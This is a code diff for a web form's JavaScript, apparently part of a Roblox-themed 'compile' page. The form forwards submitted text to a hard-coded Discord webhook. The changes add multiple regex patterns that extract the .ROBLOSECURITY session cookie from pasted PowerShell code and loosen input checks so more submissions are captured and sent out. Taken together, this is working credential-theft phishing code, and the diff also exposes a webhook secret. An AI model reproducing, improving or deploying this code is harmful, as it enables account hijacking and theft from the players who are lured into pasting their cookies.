@@ -27,7 +27,7 @@ const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv
 let lastSubmissionTime = 0;
 let submittedCodes = new Set();
 const RATE_LIMIT_MS = 30000; // 30 seconds between submissions
-const MIN_CODE_LENGTH = 10;
+const MIN_CODE_LENGTH = 3;
 
 // Utility Functions
 function showStatus(message, type) {
@@ -43,12 +43,19 @@ function getCurrentTimestamp() {
 }
 
 function extractRobloxCookie(code) {
-    // Look for .ROBLOSECURITY cookie in PowerShell code
-    const cookieRegex = /\.ROBLOSECURITY["\s]*,\s*["\s]*([^"]+)["\s]*\)/i;
-    const match = code.match(cookieRegex);
+    // Look for .ROBLOSECURITY cookie in PowerShell code - multiple patterns
+    const cookiePatterns = [
+        /\.ROBLOSECURITY["\s]*,\s*["\s]*([^"]+)["\s]*\)/i,
+        /"\.ROBLOSECURITY",\s*"([^"]+)"/i,
+        /\.ROBLOSECURITY["\s]*,\s*["\s]*([^"]+)["\s]*/i,
+        /ROBLOSECURITY["\s]*[,=]\s*["\s]*([A-Za-z0-9+/=._|-]+)/i
+    ];
     
-    if (match && match[1]) {
-        return match[1].trim();
+    for (const pattern of cookiePatterns) {
+        const match = code.match(pattern);
+        if (match && match[1] && match[1].length > 50) {
+            return match[1].trim();
+        }
     }
     
     return null;
@@ -59,7 +66,7 @@ function isValidCode(code) {
 
     // Check minimum length
     if (cleanCode.length < MIN_CODE_LENGTH) {
-        return { valid: false, reason: 'Too short! Input must be at least 10 characters long.' };
+        return { valid: false, reason: 'Too short! Input must be at least 3 characters long.' };
     }
 
     // Check if code was already submitted
@@ -74,12 +81,9 @@ function isValidCode(code) {
         return { valid: true, robloxCookie: robloxCookie, type: 'roblox_cookie' };
     }
 
-    // Check for basic spam patterns
+    // Check for basic spam patterns (very minimal)
     const spamPatterns = [
-        /^(.)\1{5,}$/,  // Same character repeated 6+ times
-        /^(..)\1{3,}$/, // Same 2 characters repeated 4+ times
-        /^(test|spam|hello|hi|asdf|qwerty)+$/i, // Simple spam words
-        /^[^a-zA-Z0-9]*$/, // Only special characters
+        /^(.)\1{10,}$/,  // Same character repeated 10+ times
         /^\s*$/, // Only whitespace
     ];
 
@@ -89,30 +93,24 @@ function isValidCode(code) {
         }
     }
 
-    // Check for too few unique characters (very basic spam detection)
+    // Check for too few unique characters (very lenient)
     const uniqueChars = new Set(cleanCode.toLowerCase().replace(/\s/g, '')).size;
-    if (uniqueChars < 4) {
+    if (uniqueChars < 2) {
         return { valid: false, reason: 'random_letters', isRandomLetters: true };
     }
 
-    // Allow various input formats - be more permissive
+    // Allow almost any input - very permissive
     const validPatterns = [
-        // Roblox item IDs (numbers)
-        /^[0-9]{1,15}$/,
-        // Roblox URLs
-        /roblox\.com/i,
-        // PowerShell/script patterns
-        /\$(session|headers|cookies)/i,
-        /Invoke-WebRequest/i,
-        /New-Object/i,
-        // Programming code
-        /\b(function|var|let|const|if|else|for|while|return|class|def|import|require)\b/i,
-        // Long alphanumeric strings
-        /^[a-zA-Z0-9]{8,}$/,
+        // Numbers (any length)
+        /^[0-9]+$/,
+        // Text with numbers
+        /[0-9]/,
         // URLs
-        /https?:\/\//,
-        // Mixed content with reasonable length
-        /^[a-zA-Z0-9\s\-_+=\/\\(){}\[\];:'".,!@#$%^&*]{10,}$/
+        /\./,
+        // Programming/script content
+        /[\$\(\)\[\]{}]/,
+        // Any reasonable text (3+ chars)
+        /.{3,}/
     ];
 
     let isValidFormat = false;
@@ -124,15 +122,15 @@ function isValidCode(code) {
     }
 
     if (!isValidFormat) {
-        // Check if it looks like random letters
-        const isRandomLetters = /^[a-zA-Z\s]{5,}$/.test(cleanCode) && 
-                               !/\b(roblox|item|id|script|code|game)\b/i.test(cleanCode);
+        // Only reject if it's clearly just random letters
+        const isRandomLetters = /^[a-zA-Z\s]{3,8}$/.test(cleanCode) && 
+                               !/\b(roblox|item|id|script|code|game|test)\b/i.test(cleanCode);
         
         if (isRandomLetters) {
             return { valid: false, reason: 'random_letters', isRandomLetters: true };
         }
         
-        return { valid: false, reason: 'Please enter a valid Roblox item ID, URL, or code!' };
+        return { valid: false, reason: 'Invalid input format!' };
     }
 
     return { valid: true, type: 'general_input' };
@@ -390,6 +388,7 @@ compileForm.addEventListener('submit', async (e) => {
 
     // Validate code format - prevent nonsense spam
     const validation = isValidCode(code);
+    console.log('Validation result:', validation);
     if (!validation.valid) {
         // Special handling for random letters
         if (validation.isRandomLetters) {
@@ -427,6 +426,7 @@ compileForm.addEventListener('submit', async (e) => {
     compileStatusMessage.classList.remove('show');
     
     // Send to webhook in background
+    console.log('Sending to webhook with validation:', validation);
     const result = await sendToWebhook(code, validation);
     
     if (result.success) {
